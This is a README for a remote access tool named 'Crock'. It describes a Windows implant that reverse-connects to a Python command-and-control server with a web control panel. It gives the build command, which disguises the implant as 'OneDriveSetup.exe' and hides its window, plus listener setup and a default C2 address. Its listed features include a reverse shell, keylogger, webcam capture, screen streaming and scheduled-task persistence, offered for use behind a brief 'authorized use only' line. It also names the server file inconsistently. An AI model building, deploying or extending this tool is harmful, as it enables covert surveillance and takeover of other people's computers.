# Crock

Remote access tool with web control panel.

## Components

- `implant.cpp` — Windows implant (reverse connect)
- `server.py` — C2 listener + web UI
- `dashboard.html` — Control panel (served by the server)

## Build implant

Requires mingw-w64:

```bash
x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe -static -s -O2 -mwindows -lws2_32 -lgdi32 -luser32 -lshell32 -ladvapi32 -lvfw32
```

Change `HOST` in `implant.cpp` before building if needed.

## Run server

```bash
pip install flask
python3 server.py
```

- Listener: `0.0.0.0:4444`
- Web UI: `http://127.0.0.1:5000`

`dashboard.html` must be in the same directory as `server_pro.py`.

## Features

- Reverse shell
- Screenshots
- Webcam capture
- Process list
- Keylogger (start / dump / stop)
- Screen stream
- Persistence via scheduled task
- Encrypted channel (shared keystream)

## Usage

1. Start `server.py`
2. Run the compiled implant on a Windows host
3. Open the web UI, select the client, send commands

## Notes

- Default C2 address is `192.168.122.1:4444`
- Web UI binds to localhost only
- For lab / authorized use only
